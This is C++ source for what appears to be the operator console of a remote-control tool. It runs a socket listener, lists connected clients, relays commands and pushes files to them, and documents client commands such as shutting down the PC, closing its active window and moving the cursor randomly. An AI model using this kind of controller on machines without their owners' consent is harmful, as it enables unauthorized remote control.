//-- The C standard Library
#include <cstdlib>

#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib") //--Pragma comment for linker.

#include <windows.h>

//-- Other headers.
#include "sEncryption.h"
#include "Controller.h"

//--Standard includes.
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <thread>
#include <fstream>

#define _DEBUG_
#define Version MAKEWORD(2, 2)

#undef max

using namespace std;


int __cdecl main(void)
{
	Controller c;

	
	outputColor(0xA);
	std::cout << c._startText() << "\n\nEnter the local ip and port of the server, use format localaddr:socket." << std::endl;

	outputColor(0x7);
	char inputBuffer[MAX_BUF];
	std:cin.get(inputBuffer, MAX_BUF);
	std::string inputBuffer_str = inputBuffer;

	c.ipv4ADDR = inputBuffer_str.substr(0, inputBuffer_str.find(":"));
	std::stringstream newStream;
	newStream << inputBuffer_str.substr(inputBuffer_str.find(":") + 1);
	newStream >> c.socketPort;

	std::cin.ignore(std::numeric_limits <long long>::max(), '\n');
	std::cout << std::endl << std::endl;

	WSAData socketDataStructure;

	int socketStartup = WSAStartup(Version, &socketDataStructure);

	if (socketStartup != NULL)
	{
		outputColor(0xC);
		std::cout << "Unable to start up socket!" << std::endl;
		outputColor(0x7);

		return 1;
	};
	unsigned int listeningServerSocket = socket(AF_INET, SOCK_STREAM, NULL);
	if (listeningServerSocket == INVALID_SOCKET)
	{
		outputColor(0xC);
		std::cout << "Creation of socket failed!" << std::endl;
		outputColor(0x7);

		return 1;
	};


	std::thread mainListenerThread = std::thread(Controller::listenForClients, listeningServerSocket, &c.socketPort, &c.ipv4ADDR, &c.allConnectedClients, &c.threads);

	//-- Console Parser
	while (1)
	{
		std::cout << ">>> ";
		try
		{
			char inByteBuffer[512];
			zeroBuffer(inByteBuffer, 512);
			std::cin.get(inByteBuffer, 512);


			std::string stringBuffer = std::string(inByteBuffer, strlen(inByteBuffer));
			std::stringstream stringStreamBuffer;


			if (stringBuffer.substr(0, 7) == "connect")
			{
				int clientNumber;

				std::string temporaryString = stringBuffer.substr(7);
				stringStreamBuffer << temporaryString;
				stringStreamBuffer >> clientNumber;
				c.activeClient = clientNumber;

				for (auto& cClient : c.allConnectedClients)
				{

					cClient.setIsActive(0);
				};
				c.allConnectedClients.at(clientNumber).setIsActive(1);

				outputColor(0xA);
				std::cout << "Successfully connected to client " << clientNumber << "." << std::endl;
				outputColor(0x7);
			}
			else if (stringBuffer.substr(0, 4) == "list")
			{
				int i = 0;
				for (auto& cClient : c.allConnectedClients)
				{

					if (cClient.isActive == 1)
					{
						std::cout << "|" << cClient.name << ", ip: " << cClient.ipAddress << ", client: " << i << "| <-connected" << std::endl << std::endl;
					}
					else
					{
						std::cout << "|" << cClient.name << ", ip: " << cClient.ipAddress << ", client: " << i << "|" << std::endl << std::endl;
					};
					i++;
				};
				if (i == 0)
				{
					outputColor(0xC);
					std::cout << "No clients are connected." << std::endl;
					outputColor(0x7);
				};
			}
			else if (stringBuffer.substr(0, 7) == "sendcmd")
			{
				if (c.allConnectedClients.size() == 0)
				{

					outputColor(0xC);
					std::cout << "There are no clients connected." << std::endl;
					outputColor(0x7);
					std::cin.ignore(std::numeric_limits<long long>::max(), '\n');
					continue;
				};
				unsigned int clientId = c.allConnectedClients[c.activeClient].id;

				char sendInfo[1024];
				zeroBuffer(sendInfo, 1024);
				memcpy(sendInfo, stringBuffer.substr(8).c_str(), strlen(stringBuffer.substr(8).c_str()));

				int infoSize = strlen(sendInfo);


				sendInfoToClient(clientId, sendInfo, infoSize + 1);
			}
			else if (stringBuffer.substr(0, 8) == "sendfile")
			{
				if (c.allConnectedClients.size() == 0)
				{

					outputColor(0xC);
					std::cout << "There are no clients connected." << std::endl;
					outputColor(0x7);
					std::cin.ignore(std::numeric_limits<long long>::max(), '\n');
					continue;
				};
				unsigned int clientId = c.allConnectedClients[c.activeClient].id;

				stringBuffer = stringBuffer.substr(9);

				char buf[1024];
				zeroBuffer(buf, 1024);
				for (int i = 0; i < stringBuffer.size(); i++)
				{
					if (stringBuffer[i] == '|')
					{
						buf[i] = '\x00';
						continue;
					};

					buf[i] = stringBuffer[i];
				};

				std::string filePath1 = std::string(buf, strlen(buf));
				std::string filePath2 = std::string(buf + filePath1.size() + 1, strlen(buf + filePath1.size() + 1));

				//--This is terrible. Absolutely atrocious. This is a ridiculous way to remove the spaces.
				while (filePath1[filePath1.size() - 1] == '\x20')
				{
					filePath1[filePath1.size() - 1] = '\x00';
					filePath1 = std::string(filePath1.c_str(), strlen(filePath1.c_str()));
				};
				while (filePath2[0] == '\x20')
				{
					filePath2 = std::string(filePath2.c_str() + 1, filePath2.size() - 1);
				};

				std::cout << filePath1 << filePath2 << std::endl;

				std::string command = "sendfile " + filePath2;


				sendInfoToClient(clientId, (char*)command.c_str(), command.size());

				std::ifstream inStream(filePath1.c_str(), std::ios::binary);
				inStream.seekg(0, std::ios::end);

				int fileSize = inStream.tellg();
				inStream.seekg(0, std::ios::beg);

				int endingFileSize = fileSize % MAX_BUF;

				if (endingFileSize == 0)
				{

					endingFileSize = fileSize;
				};

				while (1)
				{
					char* buf = new char[MAX_BUF];
					zeroBuffer(buf, MAX_BUF);

					inStream.read(buf, MAX_BUF);

					if (inStream.eof())
					{

						sendInfoToClient(clientId, buf, endingFileSize);

						delete[] buf;
						break;
					};

					sendInfoToClient(clientId, buf, MAX_BUF);
					delete[] buf;
				};

				inStream.close();
			}
			else if (stringBuffer.substr(0, 5) == "clear")
			{
				std::system("CLS");

				outputColor(0xA);
				std::cout << c._startText() << std::endl << std::endl;
				outputColor(0x7);
			}
			else if (stringBuffer.substr(0, 4) == "help")
			{

				std::cout <<
					"\n\n terminal commands:\n"
					"  -connect; sets an active client via its given id. I.E. connect 0 - connects to the first client, 1 is the second, and so on. (An active client is the client that can recieve data and send it back to the server.)\n"
					"  -list; lists any clients that are currently connected to the server.\n"
					"  -sendcmd; sends any [client executed commands] to the client to process.\n"
					"  -clear; clears the terminal. \n\n"
					"\nclient executed commands:\n"
					"  -close_client; disconnects the client.\n"
					"  -shutdown/restart; shuts down or restarts the client pc depending on which command is used.\n"
					"  -get_window; gets the active focused window the client pc has opened.\n"
					"  -hide_window; closes the current active window that is focused on the client pc.\n"
					"  -random_mouse; sets the current cursor position to random.\n"
					<< endl;
			};
			std::cin.ignore(std::numeric_limits<long long>::max(), '\n');
		}
		catch (std::exception& e)
		{
			outputColor(0xC);
			std::cout << "Error with the command." << std::endl;
			outputColor(0x7);

			std::cin.ignore(std::numeric_limits<long long>::max(), '\n');
		};
	};


	std::cin.get();

	return 0;
};
